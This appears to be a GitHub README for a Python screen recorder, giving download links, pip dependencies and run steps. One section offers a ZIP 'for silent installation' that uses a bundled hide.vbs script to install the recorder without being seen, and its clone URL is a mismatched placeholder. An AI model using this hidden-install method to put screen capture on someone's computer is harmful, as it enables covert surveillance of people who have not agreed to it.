# 📹 Screen Recorder

Welcome to the **Projeto Cyber**! This tool allows you to easily record your screen with high resolution, perfect for creating tutorials, capturing gameplay, or saving any on-screen activity.

## 📥 Download

- [Download ZIP for silent installation of Screen Recorder](https://github.com/MuriloX06/Projeto-Cyber/raw/main/downloads%20apps/Installer/For%20silent%20installation.zip)

To install Screen Recorder silently, you run the `hide.vbs` file in the same place as `install.bat` and `Screen Recorder Installer.exe`, which is inside the **ZIP file**. Note: Extract the **ZIP file** before starting the process mentioned above.

- [Download Screen Recorder Installer](https://github.com/MuriloX06/Projeto-Cyber/raw/main/downloads%20apps/Installer/Screen%20Recorder%20Installer.exe)

- [Download Screen Recorder Portable](https://github.com/MuriloX06/Projeto-Cyber/raw/main/downloads%20apps/Portable/Screen%20Recorder.exe)

## 🌟 Features

- **High-Resolution Screen Capture**: Record your screen in stunning detail.
- **User-Friendly Interface**: Simple to use with a system tray icon for easy access.
- **Customizable File Saving**: Choose where to save your recordings.

## 🚀 Getting Started

Follow these steps to get your screen recording tool up and running:

### 1. Clone the Repository

Clone this repository to your local machine:

```bash
git clone https://github.com/yourusername/screen-recorder.git
cd screen-recorder
```

### 2. Install Dependencies

Ensure you have Python 3.6 or higher installed. Then, install the required Python libraries:

```markdown
pip install pyautogui numpy opencv-python pillow pystray
```

### 3. Run the Program

Execute the `screen_recorder.py` script to start the screen recording:

```markdown
python screen_recorder.py
```

An icon will appear in your system tray. Right-click the icon to start recording and choose where to save your file.

## 🛠 Configuration

You can adjust the following parameters in `screen_recorder.py`:

- `filename`: Set the default filename for saved recordings.
- `duration`: Define the recording duration in seconds (currently set to 60 seconds).

## 🤝 Contributing

Contributions are welcome! If you have suggestions or improvements, please fork the repository and submit a pull request. For bugs or issues, open an issue on GitHub.

---

Thank you for checking out the Screen Recorder project! We hope it helps you capture your screen effortlessly. 🌟
